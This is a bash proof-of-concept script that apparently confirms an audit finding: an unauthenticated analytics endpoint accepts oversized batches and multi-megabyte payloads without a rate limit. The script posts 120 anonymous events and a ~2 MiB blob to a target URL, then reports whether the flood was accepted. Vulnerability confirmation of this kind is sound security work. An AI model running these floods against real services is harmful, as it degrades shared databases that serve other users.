#!/usr/bin/env bash
# PoC for p10-014: POST /api/analytics enforces no batch cap, no payload cap, and no rate limit.
#
# Sibling telemetry routes each defend this exact sink:
#   /api/cli/batch          -> 1 MiB Content-Length gate (telemetry.ts:15,34) + truncation
#   /api/docs/analytics     -> 50-event cap (docs-analytics.ts:63)
#   /api/site/analytics/track -> MAX_EVENTS_PER_BATCH=50 (site-analytics.ts:269)
# /api/analytics has none of them:
#   - AnalyticsBatchSchema.events has no maxItems; strings have minLength(1) only
#     (contracts/license-ops.ts:69-71)
#   - decodeJsonBody calls request.json() with no size check (body.ts:26-40)
#   - ingestAnalytics iterates the full array, no events.length check (license.ts:893-899)
#   - no API_RATE_LIMITER call site in handlers/license.ts
#   - events without license_key are ingested anonymously (license.ts:905-908)
#
# Demonstrated effect: one unauthenticated request carries 120 anonymous 'command' events
# (siblings would cap at 50), each fanned out into 5 D1 statements via env.DB.batch()
# (~600 row writes), and a second request carries a ~2 MiB property string past the
# 1 MiB gate its siblings enforce — attacker-controlled rows/dimensions in the shared
# Free-plan D1 database that also serves auth/OTP/session/licensing writes.
#
# Target: {{BASE_URL}} (filled at confirm time; defaults to local wrangler dev)
set -u
BASE="${1:-}"
case "$BASE" in ''|*'{{'*) BASE="http://127.0.0.1:8814";; esac

# --- Step 1: anonymous oversized batch (120 events > sibling 50-event cap) -------------
N=120
python3 - "$N" <<'PY' > /tmp/p10-014-batch.json
import json, sys
n = int(sys.argv[1])
events = [{
    "event_type": "command",
    "event_name": f"flood-{i}",           # unique per event -> one analytics_daily row each
    "properties": {"arg": f"x{i}"},
    "timestamp": "2026-08-23T00:00:00Z",  # no license_key -> anonymous ingestion branch
    "session_id": "[REDACTED:secret]",
    "machine_id": "poc-machine",
    "version": "9.9.9",
    "platform": "poc-platform",
} for i in range(n)]
print(json.dumps({"events": events}))
PY
echo "[*] POSTing $N anonymous command events to $BASE/api/analytics..."
resp=$(curl -s -w "\n%{http_code}" "$BASE/api/analytics" -X POST \
  -H 'content-type: application/json' --data-binary @/tmp/p10-014-batch.json)
code=$(echo "$resp" | tail -1); body=$(echo "$resp" | head -1)
echo "batch response: HTTP $code $body"
processed=$(echo "$body" | grep -o '"processed":[0-9]*' | cut -d: -f2)

# --- Step 2: multi-megabyte payload accepted (siblings gate at 1 MiB) -------------------
python3 - <<'PY' > /tmp/p10-014-fat.json
import json
big = "A" * (2 * 1024 * 1024)  # ~2 MiB string property, stored verbatim in analytics_events
print(json.dumps({"events": [{
    "event_type": "command",
    "event_name": "fat-payload",
    "properties": {"blob": big},
    "timestamp": "2026-08-23T00:00:00Z",
    "session_id": "[REDACTED:secret]",
    "machine_id": "poc-machine",
    "version": "9.9.9",
    "platform": "poc-platform",
}]}))
PY
echo "[*] POSTing single event with ~2 MiB properties blob..."
resp2=$(curl -s -w "\n%{http_code}" "$BASE/api/analytics" -X POST \
  -H 'content-type: application/json' --data-binary @/tmp/p10-014-fat.json)
code2=$(echo "$resp2" | tail -1); body2=$(echo "$resp2" | head -1)
echo "fat response: HTTP $code2 $body2"

echo ""
echo "=== Result ==="
echo "anonymous events processed in one request: ${processed:-none} (sibling routes cap at 50)"
echo "~$((processed * 5)) D1 statements fanned out via a single env.DB.batch() call"
echo "~2 MiB payload accepted: HTTP $code2 (sibling /api/cli/batch rejects bodies > 1 MiB)"

if [ "${processed:-0}" -gt 50 ] && [ "$code2" = "200" ]; then
  echo '{"status": "confirmed", "evidence": "'"unauthenticated batch of $processed events accepted (sibling routes cap at 50), fanning out ~$((processed*5)) D1 statements; separate ~2 MiB payload accepted past the 1 MiB sibling gate"'", "notes": "no maxItems/no Content-Length cap/no rate limiter/no truncation on /api/analytics; license_key omitted bypasses telemetry policy"}'
else
  echo '{"status": "failed", "evidence": "processed='"$processed"' fat_http='"$code2"'", "notes": ""}'
fi
